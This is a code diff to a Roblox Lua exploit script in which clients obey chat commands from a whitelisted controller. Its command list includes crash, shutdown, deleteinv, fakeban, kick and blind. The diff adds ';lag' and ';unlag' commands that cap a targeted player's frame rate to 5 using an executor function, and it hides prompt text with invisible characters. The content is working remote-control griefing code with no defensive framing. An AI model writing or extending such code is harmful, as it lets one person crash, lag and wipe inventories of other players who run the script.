@@ -137,7 +137,7 @@ end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
 local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore,breakbow,dropheld,rageblade."
 local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown,mygame,flash"
-local cmds4 = "lava,dead,troll,byfron,fakeban,check,mute,unmute,funnymsg,ban,clearchat⭐"
+local cmds4 = "lava,dead,troll,byfron,fakeban,check,mute,unmute,funnymsg,ban,clearchat,lag,unlag⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 local sexlist = {
@@ -617,17 +617,34 @@ prompt.PrefixText = "⁥"
 		h = game.Players.LocalPlayer.Character.HumanoidRootPart
 		h.CFrame = h.CFrame - Vector3.new(0,1000,0)
 
-	elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
 prompt.PrefixText = "⁥"
-		local textChatService = game:GetService("TextChatService")
-		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
+local textChatService = game:GetService("TextChatService")
+textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
 
-	elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
 prompt.PrefixText = "⁥"
-		local textChatService = game:GetService("TextChatService")
-		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
+local textChatService = game:GetService("TextChatService")
+textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
+
+
+
+elseif cmd == ";lag" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+prompt.Text = "⁥"
+setfpscap(5)
+elseif cmd == ";lag" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+prompt.Text = "⁥"
+setfpscap(5)
+
+elseif cmd == ";unlag" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+prompt.Text = "⁥"
+setfpscap(0)
+elseif cmd == ";unlag" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+prompt.Text = "⁥"
+setfpscap(0)
+
 
 
 elseif cmd == ";clearchat" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
